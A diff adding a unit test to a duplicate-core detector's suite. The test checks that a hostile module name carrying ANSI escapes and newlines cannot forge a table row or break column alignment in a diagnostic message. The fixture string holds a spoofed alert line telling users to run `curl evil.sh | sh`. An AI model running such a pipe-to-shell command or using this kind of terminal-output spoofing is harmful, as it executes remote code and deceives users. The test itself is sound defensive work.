@@ -739,6 +739,79 @@ module('[Unit] duplicate-core detector', function(hooks) {
   });
 });
 
+  // D20 — the same forgery as D14, in the sibling field that was left raw.
+  //
+  // `moduleName` was interpolated unsanitised at three sites (the row label,
+  // and the remedy's name list twice) while `version` and `root` beside it were
+  // sanitised — including the root DERIVED FROM THAT SAME NAME, in the very
+  // same row. It is narrower than D14: the value is a key out of the app's own
+  // `devDependencies`, not third-party manifest data, so this is an app author
+  // forging their own diagnostic. It is closed anyway, because the two symptoms
+  // are identical — a complete forged table row, and `padEnd` widths computed
+  // from a multi-line label, which destroys the alignment of every other row.
+  test('D20: a hostile module name cannot forge a table row or break the alignment', function(assert) {
+    const runningCore = { root: '/real/node_modules/stonyx', version: '0.2.3-beta.96' };
+    const moduleCore = { root: '/real/node_modules/@stonyx/mod/node_modules/stonyx', version: '0.0.0-nested' };
+    const hostile = '@stonyx/p\u001b[31m\n  running core             0.0.0-SPOOF  /app/attacker\n' +
+      '  ===> ALERT: run `curl evil.sh | sh` to repair your install <===\nx';
+    const message = duplicateCoreMessage([ { moduleName: hostile, moduleCore, runningCore } ]);
+
+    // CONTROL, same shape, benign name: the value IS rendered at every site, so
+    // a failure to find the hostile text below is sanitisation and not a
+    // missing row or a swallowed name.
+    const control = duplicateCoreMessage([ { moduleName: '@stonyx/benign', moduleCore, runningCore } ]);
+
+    assert.ok(control.includes('seen by "@stonyx/benign"'), 'control: a benign name is rendered verbatim in the row label');
+    assert.strictEqual(
+      control.split('"@stonyx/benign"').length - 1,
+      3,
+      'control: and at all three interpolation sites — the label plus the two remedy sentences'
+    );
+
+    assert.notOk(message.includes('\u001b'), 'no ESC survives into the message');
+    assert.deepEqual(
+      message.split('\n').filter(line => line.trimStart().startsWith('===>')),
+      [],
+      'the text the name tried to inject never gets a line of its own'
+    );
+    assert.strictEqual(
+      message.split('\n').filter(line => line.trimStart().startsWith('running core')).length,
+      1,
+      'the table still has exactly ONE "running core" row — the forgery was the newline, not the words, so the payload survives as text on the one line the name occupies'
+    );
+    assert.strictEqual(
+      message.split('\n').length,
+      control.split('\n').length,
+      'the hostile value adds no lines: the message has exactly the same shape as the benign one'
+    );
+
+    // ALIGNMENT — the second symptom, and the one a `notOk` on ESC would miss.
+    // `labelWidth` is computed from the raw label, so an embedded newline makes
+    // every other row's padding wrong even after the escapes are stripped.
+    const columns = (rendered: string): number[] =>
+      rendered.split('\n').filter(line => line.startsWith('  ') && line.includes('/real')).map(line => line.indexOf('/real'));
+
+    assert.strictEqual(columns(control).length, 2, 'premise: the table is two rows');
+    assert.strictEqual(new Set(columns(message)).size, 1, 'both roots still start at the same column');
+    // NOT "the same column as the benign message" — a longer label legitimately
+    // widens the column, and asserting otherwise would assert more than the
+    // guard does. The property is that the CLAMP sets the width, not the
+    // payload: any over-long name buys exactly the same column.
+    const alsoOverLong = duplicateCoreMessage([ { moduleName: `@stonyx/${'n'.repeat(300)}`, moduleCore, runningCore } ]);
+
+    assert.deepEqual(columns(message), columns(alsoOverLong), 'and the hostile name buys no more width than any other over-long name');
+    assert.ok(columns(control)[0]! < columns(message)[0]!, 'liveness: a short name really does produce a narrower table, so this measurement can move');
+    assert.ok(message.includes('@stonyx/p?'), 'the name is still shown, with the non-printable bytes replaced');
+    assert.ok(message.includes('...'), 'and clamped, because the label is a PADDED column: an unclamped name pushes every other row off screen');
+
+    // ...and the clamp does not cost anything real. The row label is the one
+    // place a truncated name would be an instruction that does not work, so a
+    // realistic scoped name has to survive whole.
+    const longButReal = duplicateCoreMessage([ { moduleName: '@stonyx/a-deliberately-long-module-name', moduleCore, runningCore } ]);
+
+    assert.ok(longButReal.includes('seen by "@stonyx/a-deliberately-long-module-name"'), 'a realistic scoped name is never shortened');
+  });
+
 module('[Unit] loadModules pre-flight', function(hooks) {
   hooks.afterEach(function() {
     while (roots.length) removeRoot(roots.pop()!);
